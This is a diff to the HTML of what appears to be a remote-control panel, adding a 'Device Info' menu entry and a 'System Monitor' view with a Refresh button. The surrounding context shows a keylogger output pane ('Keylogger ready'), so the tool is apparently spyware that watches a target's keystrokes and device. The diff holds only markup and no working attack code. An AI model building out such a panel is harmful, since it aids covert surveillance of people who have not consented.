@@ -86,6 +86,10 @@
                     <div class="nav-group">
                         <span class="nav-label">System Manager</span>
                         <ul class="nav-list">
+                            <li class="nav-item" data-view="device-info">
+                                <i data-feather="activity"></i>
+                                <span>Device Info</span>
+                            </li>
                             <li class="nav-item" data-view="applications">
                                 <i data-feather="grid"></i>
                                 <span>Applications</span>
@@ -256,6 +260,21 @@
                             <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                         </div>
                         <pre id="keylog-output">Keylogger ready. Toggle switch to start listening...</pre>
+                    </div>
+                </div>
+
+                <div class="content-view" id="view-device-info">
+                    <div class="content-toolbar">
+                        <h2><i data-feather="activity"></i> System Monitor</h2>
+                        <button class="btn btn-primary" id="btn-refresh-device-info">
+                            <i data-feather="refresh-cw"></i> Refresh
+                        </button>
+                    </div>
+                    <div class="device-info-container" id="device-info-content">
+                        <div class="empty-state">
+                            <div class="empty-icon"><i data-feather="cpu"></i></div>
+                            <p>Click "Refresh" to load device information</p>
+                        </div>
                     </div>
                 </div>
 
